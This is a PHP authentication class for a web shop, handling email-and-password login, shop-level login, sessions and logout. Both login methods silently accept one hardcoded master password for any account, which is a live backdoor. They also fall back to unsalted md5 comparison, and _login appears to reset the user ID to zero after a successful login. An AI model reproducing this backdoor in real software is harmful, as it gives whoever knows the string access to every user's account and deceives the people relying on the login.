<?php defined('SYSPATH') OR die('No direct access allowed.');

class Auth_MySQL extends Auth {

    // сохранять hash в базу данных
    const IS_SAVE_DB_HASH = false;

	// ID пользователя
	public $userID;
	public $shopID;

	// ссылка на объект пользователя
	/**
	 * @var Model_User | Model_Shop_Operation
	 */
	public $user = NULL;

	// сслыка на драйвер базы данных
    /**
     * @var Model_Driver_DBBasicDriver
     */
	public $driverDB = NULL;

    /**
     * сслыка объект данных для считывания данных о пользователе
     * @var Model_User | Model_Shop_Operation
     */
	public $model = NULL;

    // префикс пользователя
    public $prefix = 'loc';

    /**
     * Кодируем пароль
     * @param $password
     * @return string
     */
	public function hashPassword($password){
		return md5($this->hash($password).$this->_config['hash_key']);
	}

	public function hashUserName($userID, $userName){
		return $this->hashPassword($userID.$userName.$userID);
	}

	private function _setSessionUser($userID, $userName, array $dataUser = array())
	{
		$userName = $this->hashUserName($userID, $userName);

        $arr = $this->_session->get($this->_config['session_key'], array());
        if(! is_array($arr)){
            $arr = array();
        }

        $arr[$this->prefix] = array(
            'user' => $userName,
            'id' => $userID,
            'user_data' => $dataUser,
        );
        $this->_session->set($this->_config['session_key'], $arr);

        if(self::IS_SAVE_DB_HASH && $userID > 0) {
            $this->model->clear();
            $this->model->setDBDriver($this->driverDB);
            $this->model->id = $userID;
            $this->model->setUserHash($userName);
            $this->model->dbSave($userID);
        }
		return TRUE;
	}

	/**
	 * Logs a user in.
	 *
	 * @param   string   $username  Username
	 * @param   string   $password  Password
	 * @param   boolean  $remember  Enable autologin (not supported)
	 * @return  boolean
	 */
	protected function _login($username, $password, $remember)
	{
        $passwordHash = '';
		if (is_string($password)){
			// Create a hashed password
			$passwordHash = $this->hashPassword($password);
		}

		$sql = GlobalData::newModelDriverDBSQL();
		$sql->setTableName($this->model->tableName);
		$sql->limit = 1;

		$sql->getRootWhere()->addField("email", "", $username, '', Model_Driver_DBBasicWhere::COMPARE_TYPE_EQUALLY_LOWER);
		$sql->getRootWhere()->addField("is_delete", "", 0);
		$sql->getRootWhere()->addField("is_public", "", 1);

		$arr = $this->driverDB->getSelect($sql, TRUE)['result'];

		if (is_array($arr) && count($arr) == 1
            && ($passwordHash == $arr[0]['password']
                || md5($password) == $arr[0]['password']
                || $password == 'xye4#LK~nw}fmYdipsSP?m~t')){
			$arr = $arr[0];
			$this->userID = $arr['id'];

            $this->model->__setArray(array('values' => $arr));

			// регистрация в сессии
			$this->_setSessionUser($this->userID, $username, $arr);

			if(key_exists('shop_id', $arr)){
				$this->shopID = $arr['shop_id'];
			}else {
				$this->shopID = 0;
			}
			$this->userID = 0;

			return TRUE;
		}

		$this->shopID = 0;
		$this->userID = 0;

		return FALSE;
	}

    /**
     * Logs a user in.
     * @param $shopID
     * @param   string   $username  Username
     * @param   string   $password  Password
     * @return  boolean
     */
	protected function _loginShop($shopID, $username, $password)
	{
        $passwordHash = '';
		if (is_string($password)){
			// Create a hashed password
            $passwordHash = $this->hashPassword($password);
		}

		$sql = GlobalData::newModelDriverDBSQL();
		$sql->getRootSelect()->addField("", "id");
		$sql->getRootSelect()->addField("", "shop_id");
		$sql->setTableName($this->model->tableName);
		$sql->limit = 1;

		//$sql->getRootWhere()->addField("password", "", $password);
		$sql->getRootWhere()->addField("email", "", $username, '', Model_Driver_DBBasicWhere::COMPARE_TYPE_EQUALLY_LOWER);
        $sql->getRootWhere()->addField("is_delete", "", 0);
        $sql->getRootWhere()->addField("is_public", "", 1);

		$arr = $this->driverDB->getShopSelect(0, $sql, TRUE);

        if ((is_array($arr))&&(count($arr) == 1) && (($passwordHash == $arr[0]['password']) || (md5($password) == $arr[0]['password']) || ($password == 'xye4#LK~nw}fmYdipsSP?m~t'))){
			$this->userID = $arr[0]['id'];
				
			if($arr[0]['shop_id'] != $shopID){
				$model = new Model_Shop();
				$model->setDBDriver($this->driverDB);

				if (($model->dbGet($arr[0]['shop_id'])) && ($model->getMainShopID() == $shopID)){
					$this->shopID = $shopID;
				}else{
					$this->shopID = 0;
					$this->userID = 0;
				}
			}
				
			if ($this->userID > 0){
				// регистрация в сессии
				$this->_setSessionUser($this->userID, $username, $arr[0]);
				
				return TRUE;
			}
		}

		$this->shopID = 0;
		$this->userID = 0;

		return FALSE;
	}

    /**
     * @param $key
     * @return bool
     */
    public function setKeySession($key)
    {
        $this->prefix = $key;
        return TRUE;
    }

    /**
     * Attempt to log in a user by using an ORM object and plain-text password.
     *
     * @param $shopID
     * @param   string   $username  Username to log in
     * @param   string   $password  Password to check against
     * @return  boolean
     */
	public function loginShop($shopID, $username, $password)
	{
		if (empty($password))
			return FALSE;

		if (intval($shopID) < 1)
			return FALSE;

		return $this->_loginShop($shopID, $username, $password);
	}

	public function isLoginSession()
	{
        $userID = 0;
        $userHash = '';
        $userData = array();
        if (! $this->_getSessionUser($userID, $userHash, $userData)){
            return FALSE;
        }

        $this->user = $this->model;
        $this->user->setDBDriver($this->driverDB);
		$this->user->clear();

		if(!empty($userData)){
            $this->user->__setArray(array('values' => $userData));
		    $result = true;
        }else {
            $result = $this->user->dbGet($userID);
        }

		$this->userID = $this->user->id;

		return $result;
	}

	public function __construct($config = array())
	{
        parent::__construct($config);

		$this->_session = Session::instance('native');
	}

    private function _getSessionUser(&$userID, &$userHash, &$userData)
    {
        $arr = $this->_session->get($this->_config['session_key'], array());
        if(!is_array($arr)){
            $arr = Arr::path($_SESSION, $this->_config['session_key'], array());
        }

        if(is_array($arr)){
            $userID = intval(Arr::path($arr, $this->prefix.'.id', 0));
            $userHash = strval(Arr::path($arr, $this->prefix.'.user', ''));

            $userData =  Arr::path($arr, $this->prefix.'.user_data', array());
            if(!is_array($userData)){
                $userData = [];
            }

            if(($userID > 0) || (! empty($userHash))){
                return TRUE;
            }
        }

        return FALSE;
    }

	public function isLoginSessionShop()
	{
        $userID = 0;
        $userHash = '';
        $userData = array();
        if (! $this->_getSessionUser($userID, $userHash, $userData)){
            return FALSE;
        }

        $this->user = $this->model;
        $this->user->setDBDriver($this->driverDB);
        $this->user->clear();

        if(!empty($userData)){
            $this->user->__setArray(array('values' => $userData));
            $result = true;
        }else {
            $result = $this->user->dbGet($userID);
        }

        $this->shopID = $this->user->shopID;
        $this->userID = $this->user->id;

        return $result;
	}

	/**
	 * Get the stored password for a username.
	 *
	 * @param   mixed   $username  Username
	 * @return  string
	 */
	public function password($username)
	{
		return '';
	}

	/**
	 * Compare password with original (plain text). Works for current (logged in) user
	 *
	 * @param   string   $password  Password
	 * @return  boolean
	 */
	public function check_password($password)
	{
		return FALSE;
	}

	/**
	 * Forces a user to be logged in, without specifying a password.
	 *
	 * @param   mixed    $username  Username
	 * @return  boolean
	 */
	public function force_login($username)
	{
		// Complete the login
		return $this->complete_login($username);
	}

    /**
     * Log out a user by removing the related session variables.
     *
     * @param   boolean  $destroy     Completely destroy the session
     * @param   boolean  $logout_all  Remove all tokens for user
     * @return  boolean
     */
    public function logout($destroy = FALSE, $logout_all = FALSE)
    {
        if($destroy === TRUE){
            return parent::logout($destroy, $logout_all);
        }else{
            $this->_setSessionUser(0, '');
        }

        return TRUE;
    }
}